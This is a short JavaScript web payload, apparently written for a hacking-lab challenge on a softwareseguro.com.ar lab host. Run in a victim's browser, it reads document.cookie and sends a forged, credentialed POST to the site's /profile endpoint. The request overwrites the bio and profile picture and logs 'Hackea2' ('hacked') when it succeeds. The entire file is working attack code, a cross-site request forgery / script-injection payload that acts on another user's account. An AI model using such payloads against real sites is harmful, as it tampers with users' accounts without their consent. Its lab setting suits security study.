async function cambiarImagen() {
    const url = 'https://chl-ec0b1939-8862-4322-8d09-8f0838f10ed1-blog-hacklab.softwareseguro.com.ar/profile';
    const formData = new FormData();
    formData.append('bio', 'None');
    const emptyFile = new Blob([], { type: 'application/octet-stream' });
    formData.append('profile_pic', emptyFile, ''); 

    const cookie = document.cookie;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Cookie': cookie,
            },
            body: formData,
            credentials: 'include' 
        });

        if (response.ok) {
            const responseData = await response.json();
            console.log('Hackea2:', responseData);
        } else {
            console.error('NoHackea2:', response.statusText);
        }
    } catch (error) {
        console.error('Error del fetch:', error);
    }
}

cambiarImagen();
